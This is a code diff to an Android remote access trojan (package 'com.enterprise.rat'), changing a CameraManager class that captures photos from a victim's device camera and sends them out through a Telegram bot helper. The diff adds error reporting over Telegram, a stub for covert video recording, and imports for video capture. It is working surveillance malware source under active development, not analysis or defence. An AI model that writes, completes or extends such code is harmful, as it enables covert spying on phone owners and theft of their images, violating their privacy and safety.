@@ -1,10 +1,10 @@
 package com.enterprise.rat.commands;
 
 import android.content.Context;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
+import android.os.Environment;
+import android.media.MediaRecorder;
 import com.enterprise.rat.utils.TelegramApi;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -28,11 +28,15 @@ public class CameraManager {
                     fos.write(data);
                     fos.close();
                     TelegramApi.sendPhoto(photoFile, "📸 Captured from Camera " + cameraId);
-                } catch (Exception e) {}
+                } catch (Exception e) { TelegramApi.sendMessage("❌ Save error"); }
                 cam.release();
             });
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Camera Error: " + e.getMessage());
         }
+    }
+
+    public void recordVideo(int durationSeconds) {
+        TelegramApi.sendMessage("🎥 Video recording placeholder (" + durationSeconds + "s)");
     }
 }
